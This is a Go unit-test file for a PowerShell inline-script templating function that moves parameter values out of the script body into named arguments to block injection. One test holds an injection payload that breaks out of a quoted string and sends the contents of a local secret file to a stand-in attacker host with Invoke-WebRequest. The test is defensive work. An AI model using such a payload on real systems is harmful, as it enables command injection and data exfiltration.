// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2025-present Datadog, Inc.

// Tests for transformInlineScript live in a separate file so they can run on
// all platforms (the production code is windows-only, but the logic under test
// has no OS dependency).  We duplicate the small helpers needed here rather
// than adding a non-windows build-tag to the production file.

package com_datadoghq_script

import (
	"strings"
	"testing"
)

// TestTransformInlineScript_SimpleParam verifies that a single string parameter
// is extracted from the script body and placed in the param() block.
func TestTransformInlineScript_SimpleParam(t *testing.T) {
	script := `Write-Output "Hello {{ parameters.name }}"`
	params := map[string]interface{}{"name": "Alice"}

	result, err := transformInlineScript(script, params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Script body should reference the variable, not the raw value.
	if strings.Contains(result.Script, "Alice") {
		t.Error("user value must not appear in the script text")
	}
	if !strings.Contains(result.Script, "$__par_name") {
		t.Errorf("expected $__par_name in script, got:\n%s", result.Script)
	}
	if !strings.Contains(result.Script, "param(") {
		t.Errorf("expected param() block in script, got:\n%s", result.Script)
	}

	// Value must be passed as a named OS argument.
	if len(result.ScriptArgs) != 2 || result.ScriptArgs[0] != "-__par_name" || result.ScriptArgs[1] != "Alice" {
		t.Errorf("unexpected ScriptArgs: %v", result.ScriptArgs)
	}
}

// TestTransformInlineScript_InjectionPrevented verifies that a value containing
// PowerShell special characters cannot escape the script context.
func TestTransformInlineScript_InjectionPrevented(t *testing.T) {
	script := `Write-Output "Hello {{ parameters.name }}"`
	// Attempt to inject an arbitrary command via the parameter value.
	malicious := `"; Invoke-WebRequest http://attacker.example/exfil -Body (Get-Content C:\secret.txt); Write-Output "`
	params := map[string]interface{}{"name": malicious}

	result, err := transformInlineScript(script, params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// The malicious string must not appear in the script text at all.
	if strings.Contains(result.Script, "Invoke-WebRequest") {
		t.Error("injected command must not appear in the script text")
	}

	// It must be present verbatim as a ScriptArgs value.
	found := false
	for _, arg := range result.ScriptArgs {
		if arg == malicious {
			found = true
		}
	}
	if !found {
		t.Errorf("parameter value not found in ScriptArgs; got: %v", result.ScriptArgs)
	}
}

// TestTransformInlineScript_NestedParam verifies deep parameter paths up to
// the supported maximum depth.
func TestTransformInlineScript_NestedParam(t *testing.T) {
	script := `Write-Output "{{ parameters.a.b.c.d.e }}"`
	params := map[string]interface{}{
		"a": map[string]interface{}{
			"b": map[string]interface{}{
				"c": map[string]interface{}{
					"d": map[string]interface{}{
						"e": "deep",
					},
				},
			},
		},
	}

	result, err := transformInlineScript(script, params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	expectedVar := "$__par_a_b_c_d_e"
	if !strings.Contains(result.Script, expectedVar) {
		t.Errorf("expected %s in script, got:\n%s", expectedVar, result.Script)
	}

	if len(result.ScriptArgs) != 2 || result.ScriptArgs[0] != "-__par_a_b_c_d_e" || result.ScriptArgs[1] != "deep" {
		t.Errorf("unexpected ScriptArgs: %v", result.ScriptArgs)
	}
}

// TestTransformInlineScript_ExceedsMaxDepth ensures an error is returned for
// paths deeper than maxParameterDepth.
func TestTransformInlineScript_ExceedsMaxDepth(t *testing.T) {
	script := `Write-Output "{{ parameters.a.b.c.d.e.f }}"`
	params := map[string]interface{}{}

	_, err := transformInlineScript(script, params)
	if err == nil {
		t.Fatal("expected an error for depth > maxParameterDepth, got nil")
	}
	if !strings.Contains(err.Error(), "maximum supported nesting depth") {
		t.Errorf("unexpected error message: %v", err)
	}
}

// TestTransformInlineScript_MultipleParams verifies that each distinct parameter
// path maps to its own variable and that duplicate references produce only one entry.
func TestTransformInlineScript_MultipleParams(t *testing.T) {
	// "name" is used twice; only one ScriptArg pair should be emitted.
	script := `Write-Output "{{ parameters.first }} {{ parameters.last }}"; Write-Output "{{ parameters.first }}"`
	params := map[string]interface{}{"first": "John", "last": "Doe"}

	result, err := transformInlineScript(script, params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Expect exactly two pairs: -__par_first John  -__par_last Doe
	if len(result.ScriptArgs) != 4 {
		t.Errorf("expected 4 ScriptArgs (2 pairs), got %d: %v", len(result.ScriptArgs), result.ScriptArgs)
	}
}

// TestTransformInlineScript_MissingParam verifies that a missing parameter is
// silently omitted from ScriptArgs (the param() $null default applies in PowerShell).
func TestTransformInlineScript_MissingParam(t *testing.T) {
	script := `Write-Output "{{ parameters.optional }}"`
	params := map[string]interface{}{} // "optional" not provided

	result, err := transformInlineScript(script, params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(result.ScriptArgs) != 0 {
		t.Errorf("expected empty ScriptArgs for missing param, got: %v", result.ScriptArgs)
	}
	// The param() block should still declare the variable with a $null default.
	if !strings.Contains(result.Script, "$__par_optional = $null") {
		t.Errorf("expected $null default in param() block, got:\n%s", result.Script)
	}
}

// TestTransformInlineScript_NumericParam verifies float64 (JSON-decoded) numbers.
func TestTransformInlineScript_NumericParam(t *testing.T) {
	script := `$x = {{ parameters.count }}`
	params := map[string]interface{}{"count": float64(42)}

	result, err := transformInlineScript(script, params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(result.ScriptArgs) != 2 || result.ScriptArgs[1] != "42" {
		t.Errorf("unexpected ScriptArgs: %v", result.ScriptArgs)
	}
}

// TestTransformInlineScript_NoParams verifies that a script without any
// template expressions passes through unchanged (no param() block added).
func TestTransformInlineScript_NoParams(t *testing.T) {
	script := `Write-Output "Hello World"`

	result, err := transformInlineScript(script, map[string]interface{}{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if strings.Contains(result.Script, "param(") {
		t.Errorf("unexpected param() block in param-free script:\n%s", result.Script)
	}
	if len(result.ScriptArgs) != 0 {
		t.Errorf("unexpected ScriptArgs: %v", result.ScriptArgs)
	}
}

// TestTransformInlineScript_ArrayIndexParam verifies that array-index paths work
// using Handlebars bracket notation (bare integers are not valid path tokens).
func TestTransformInlineScript_ArrayIndexParam(t *testing.T) {
	// The raymond lexer requires bracket notation for numeric array indices.
	script := `Write-Output "{{ parameters.items.[0] }}"`
	params := map[string]interface{}{
		"items": []interface{}{"first", "second"},
	}

	result, err := transformInlineScript(script, params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// pathToVarName strips the brackets: "[0]" → "_0_" (brackets become underscores)
	if len(result.ScriptArgs) != 2 || result.ScriptArgs[1] != "first" {
		t.Errorf("unexpected ScriptArgs: %v", result.ScriptArgs)
	}
}

// TestSerializeParamValue covers the type-dispatch in serializeParamValue.
func TestSerializeParamValue(t *testing.T) {
	tests := []struct {
		name  string
		input interface{}
		want  string
	}{
		{"nil", nil, ""},
		{"string", "hello", "hello"},
		{"string with special chars", `"it's" a $test`, `"it's" a $test`},
		{"bool true", true, "true"},
		{"bool false", false, "false"},
		{"integer float64", float64(7), "7"},
		{"fractional float64", float64(3.14), "3.14"},
		{"object", map[string]interface{}{"k": "v"}, `{"k":"v"}`},
		{"array", []interface{}{1.0, 2.0}, `[1,2]`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := serializeParamValue(tc.input)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tc.want {
				t.Errorf("got %q, want %q", got, tc.want)
			}
		})
	}
}

// TestPathToVarName covers the variable-name conversion.
func TestPathToVarName(t *testing.T) {
	tests := []struct {
		path []string
		want string
	}{
		{[]string{"parameters", "name"}, "__par_name"},
		{[]string{"parameters", "address", "city"}, "__par_address_city"},
		{[]string{"parameters", "items", "[0]"}, "__par_items__0_"}, // bracket notation → underscores
		{[]string{"parameters", "foo-bar"}, "__par_foo_bar"}, // hyphen → underscore
		{[]string{"parameters", "a", "b", "c", "d", "e"}, "__par_a_b_c_d_e"},
	}
	for _, tc := range tests {
		got := pathToVarName(tc.path)
		if got != tc.want {
			t.Errorf("pathToVarName(%v) = %q, want %q", tc.path, got, tc.want)
		}
	}
}
